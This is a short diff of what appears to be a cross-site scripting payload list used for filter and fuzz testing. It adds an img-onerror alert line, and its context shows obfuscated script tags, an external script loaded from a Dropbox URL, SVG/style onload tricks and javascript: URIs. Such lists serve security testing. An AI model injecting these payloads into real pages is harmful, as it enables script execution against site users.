@@ -108,6 +108,8 @@ http://www.google<script .com>alert(document.location)</script
 
 //|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
 
+<img src=lol onerror="alert('img tag')" />
+
 </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
 
 <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
